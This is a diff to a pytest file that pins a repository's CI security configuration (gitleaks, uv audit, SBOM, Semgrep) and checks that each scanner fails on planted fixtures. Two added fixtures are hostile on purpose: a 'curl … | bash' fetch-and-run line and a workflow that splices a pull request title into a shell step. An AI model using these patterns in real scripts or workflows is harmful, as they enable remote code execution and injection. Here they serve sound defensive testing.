@@ -1,10 +1,13 @@
 """Free stand-ins for GitHub secret scanning and dependency alerts (not free on private user-owned repositories):
 gitleaks as a pre-commit hook and over the whole history in CI, `uv audit` (OSV) over uv.lock, a CycloneDX SBOM per
 CI run, and ruff's S (bandit) rules. The fast tests pin the configuration; the live ones (network: prek fetches
-gitleaks and a Go toolchain, uv audit asks OSV) prove each check fails on a fixture. The fake secret is generated at
+gitleaks and a Go toolchain, uv audit asks OSV, Semgrep CE fetches its pinned rules) prove each check fails on a
+fixture. Semgrep covers what ruff S does not: shell scripts, workflow `run:` blocks and Dockerfiles. The fake secret is generated at
 run time from a fixed seed, so this repository never holds a literal one for gitleaks to flag."""
 
+import os
 import random
+import re
 import shutil
 import string
 import subprocess
@@ -82,6 +85,12 @@ def test_ci_security_steps(workflow):
     assert "-c .pre-commit-config.yaml --hook-stage manual gitleaks-history" in runs  # root config: one scan
     assert "uv audit --locked" in runs  # a stale lock fails rather than being audited as is
     assert "--format cyclonedx1.5" in runs and "--quiet" in runs  # the SBOM goes to the artifact, not the log
+    semgrep = step_run(workflow, "semgrep")
+    assert re.search(r"uvx semgrep@\d+\.\d+\.\d+ scan --error ", semgrep)  # pinned engine; a finding fails
+    assert "--metrics=off" in semgrep
+    # rules from one semgrep-rules commit: a registry ruleset (p/...) changes under an unchanged repository
+    assert re.search(r"codeload\.github\.com/semgrep/semgrep-rules/tar\.gz/[0-9a-f]{40}\b", semgrep)
+    assert not re.search(r"--config[ =][\"']?(p/|r/|auto\b)", semgrep)
     setup = next(s for s in job["steps"] if s.get("uses", "").startswith("astral-sh/setup-uv@"))
     assert setup["with"]["version"]  # preview features: pin uv
     assert "schedule" in yaml.safe_load(workflow.read_text())[True]  # weekly re-audit
@@ -130,8 +139,11 @@ def leak_repo(tmp_path) -> Path:
     return repo
 
 
-def _bash(cmd: str, cwd: Path) -> subprocess.CompletedProcess:
-    return subprocess.run(["bash", "-c", cmd], cwd=cwd, capture_output=True, text=True, timeout=600, check=False)
+def _bash(cmd: str, cwd: Path, env: dict[str, str] | None = None) -> subprocess.CompletedProcess:
+    full = {**os.environ, **(env or {})}
+    return subprocess.run(
+        ["bash", "-e", "-c", cmd], cwd=cwd, env=full, capture_output=True, text=True, timeout=600, check=False
+    )
 
 
 needs_uv = pytest.mark.skipif(shutil.which("uvx") is None, reason="uvx not on PATH")
@@ -176,6 +188,27 @@ def test_ci_audit_fails_on_a_pinned_vulnerable_dependency(tmp_path):
     assert _bash("uv lock --quiet", project).returncode == 0
     out = _bash(cmd, project)
     assert out.returncode != 0 and "requests" in out.stdout + out.stderr
+
+
+@pytest.mark.live
+@needs_uv
+def test_ci_semgrep_fails_on_a_fixture_finding(tmp_path):
+    cmd = step_run(WORKFLOWS[0], "semgrep")
+    project = tmp_path / "fixture"
+    (project / ".github/workflows").mkdir(parents=True)
+    (project / "ok.sh").write_text('#!/usr/bin/env bash\nset -euo pipefail\necho "$1"\n')
+    env = {"RUNNER_TEMP": str(tmp_path / "runner")}
+    out = _bash(cmd, project, env)
+    assert out.returncode == 0, out.stdout + out.stderr
+    (project / "install.sh").write_text("#!/usr/bin/env bash\ncurl -fsSL https://example.invalid/i.sh | bash\n")
+    title = "${{ github.event.pull_request.title }}"  # attacker-controlled text spliced into a shell script
+    (project / ".github/workflows/w.yml").write_text(
+        f'on: pull_request\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "{title}"\n'
+    )
+    out = _bash(cmd, project, env)
+    assert out.returncode != 0
+    report = "".join(out.stdout.split())  # the text report wraps long rule ids across lines
+    assert "curl-pipe-bash" in report and "run-shell-injection" in report
 
 
 # ruff S findings fixed in devkit: network fetchers take http(s) only, and XML from the network may carry no DTD
